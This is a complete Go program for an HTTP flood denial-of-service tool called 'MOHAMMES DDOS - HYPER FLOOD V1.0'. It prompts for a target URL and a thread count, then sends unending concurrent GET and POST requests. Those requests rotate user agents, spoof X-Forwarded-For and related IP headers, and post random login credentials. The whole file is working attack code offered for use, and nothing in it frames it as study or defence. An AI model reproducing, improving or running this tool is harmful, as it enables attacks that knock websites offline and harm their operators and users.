package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var (
	targetURL    string
	threads      int
	wg           sync.WaitGroup
	stopCtx      context.Context
	stopCancel   context.CancelFunc
	requestCount uint64
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
}

var paths = []string{
	"/", "/login", "/admin", "/search?q=random", "/index.php", "/wp-login.php", "/api/v1/auth", "/.env", "/config.json",
}

func init() {
	rand.Seed(time.Now().UnixNano())
}

func randomString(n int) string {
	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func generateIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255))
}

func attack(client *http.Client) {
	defer wg.Done()
	for {
		select {
		case <-stopCtx.Done():
			return
		default:
			method := "GET"
			path := paths[rand.Intn(len(paths))]
			var body *strings.Reader

			if rand.Intn(2) == 0 {
				method = "POST"
				path = "/login"
				body = strings.NewReader(fmt.Sprintf("username=%s&password=%s", randomString(8), randomString(8)))
			} else {
				body = strings.NewReader("")
			}

			req, err := http.NewRequestWithContext(stopCtx, method, targetURL+path, body)
			if err != nil {
				continue
			}

			req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
			req.Header.Set("X-Forwarded-For", generateIP())
			req.Header.Set("X-Real-IP", generateIP())
			req.Header.Set("Client-IP", generateIP())
			req.Header.Set("X-Originating-IP", generateIP())
			req.Header.Set("Cookie", fmt.Sprintf("session=%s", randomString(32)))
			req.Header.Set("Accept", "*/*")
			req.Header.Set("Connection", "keep-alive")

			resp, err := client.Do(req)
			if err == nil {
				resp.Body.Close()
				atomic.AddUint64(&requestCount, 1)
			}
		}
	}
}

func main() {
	banner := `
	███╗   ███╗ ██████╗ ██╗  ██╗ █████╗ ███╗   ███╗███╗   ███╗███████╗███████╗
	████╗ ████║██╔═══██╗██║  ██║██╔══██╗████╗ ████║████╗ ████║██╔════╝██╔════╝
	██╔████╔██║██║   ██║███████║███████║██╔████╔██║██╔████╔██║█████╗  ███████╗
	██║╚██╔╝██║██║   ██║██╔══██║██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝  ╚════██║
	██║ ╚═╝ ██║╚██████╔╝██║  ██║██║  ██║██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗███████║
	╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝
	                  MOHAMMES DDOS - HYPER FLOOD V1.0
	`
	fmt.Println(banner)

	reader := bufio.NewReader(os.Stdin)

	fmt.Print("Enter Target URL (e.g., http://target.com): ")
	targetURL, _ = reader.ReadString('\n')
	targetURL = strings.TrimSpace(targetURL)

	_, err := url.ParseRequestURI(targetURL)
	if err != nil {
		fmt.Println("Invalid URL format. Include http:// or https://")
		return
	}

	fmt.Print("Enter Concurrent Threads (e.g., 2000): ")
	fmt.Scanln(&threads)

	tr := &http.Transport{
		MaxIdleConns:        10000,
		MaxIdleConnsPerHost: 10000,
		IdleConnTimeout:     90 * time.Second,
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		DialContext: (&net.Dialer{
			Timeout:   5 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   10 * time.Second,
	}

	stopCtx, stopCancel = context.WithCancel(context.Background())

	fmt.Printf("[*] Launching HYPER-FLOOD on %s with %d threads...\n", targetURL, threads)
	
	go func() {
		for {
			select {
			case <-stopCtx.Done():
				return
			default:
				time.Sleep(1 * time.Second)
				fmt.Printf("\r[+] Requests Sent: %d", atomic.LoadUint64(&requestCount))
			}
		}
	}()

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go attack(client)
	}

	fmt.Println("\n[*] Press ENTER to stop the attack.")
	bufio.NewReader(os.Stdin).ReadBytes('\n')
	
	stopCancel()
	fmt.Println("\n[!] Stopping attack. Waiting for connections to close...")
	wg.Wait()
	fmt.Println("\n[!] Attack stopped.")
}
